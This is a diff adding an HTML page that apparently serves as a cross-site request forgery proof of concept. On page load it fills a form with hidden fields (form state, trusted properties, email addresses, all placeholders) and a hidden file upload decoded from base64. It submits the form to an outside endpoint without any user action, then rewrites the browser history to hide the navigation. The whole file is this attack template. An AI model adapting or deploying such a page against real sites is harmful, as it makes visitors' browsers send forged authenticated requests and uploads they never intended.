@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submission</title>
+</head>
+<body>
+    <!-- Form that will be dynamically populated and submitted via JavaScript -->
+    <form id="dynamicForm" action="https://example.com/form-submission" method="POST" enctype="multipart/form-data">
+        <input type="submit" id="submitButton" value="Submit request" />
+    </form>
+
+    <script>
+        const form = document.getElementById('dynamicForm');
+
+        // Function to create a hidden input field
+        function createHiddenInput(name, value) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = name;
+            input.value = value;
+            return input;
+        }
+
+        // Add hidden inputs to the form
+        form.appendChild(createHiddenInput('form_state', 'STATE_VALUE'));
+        form.appendChild(createHiddenInput('trusted_properties', 'TRUSTED_PROPERTIES_VALUE'));
+        form.appendChild(createHiddenInput('account_email', 'example@example.com'));
+        form.appendChild(createHiddenInput('contact_email', 'example@example.com'));
+        form.appendChild(createHiddenInput('question_area', 'example@example.com'));
+
+        // Base64-encoded string of a sample file (image)
+        const base64String = 'iVBORw0KGgoAAAANSUhEUgAAAAUA' + 
+                             'AAAFCAYAAACNbyblAAAAHElEQVQI12P4' + 
+                             '//8/w38GIAXDIBKE0DHxgljNBAAO' +
+                             '9TXL0Y4OHwAAAABJRU5ErkJggg==';
+        const fileName = 'screenshot.jpg';
+        const mimeType = 'image/jpeg';
+
+        // Function to convert a base64 string to a Blob
+        function base64ToBlob(base64, mimeType) {
+            const binary = atob(base64);
+            const len = binary.length;
+            const buffer = new Uint8Array(len);
+            for (let i = 0; i < len; i++) {
+                buffer[i] = binary.charCodeAt(i);
+            }
+            return new Blob([buffer], { type: mimeType });
+        }
+
+        // Create a Blob from the base64 string and a File from the Blob
+        const blob = base64ToBlob(base64String, mimeType);
+        const file = new File([blob], fileName, { type: mimeType });
+
+        // Create a hidden file input and assign the file to it
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.style.display = 'none';
+        fileInput.name = 'screenshot';
+
+        const fileList = new DataTransfer();
+        fileList.items.add(file);
+        fileInput.files = fileList.files;
+
+        // Add the file input to the form
+        form.appendChild(fileInput);
+
+        // Submit the form automatically
+        form.submit();
+
+        // Optionally update the browser history
+        history.pushState('', '', '/');
+    </script>
+</body>
+</html>
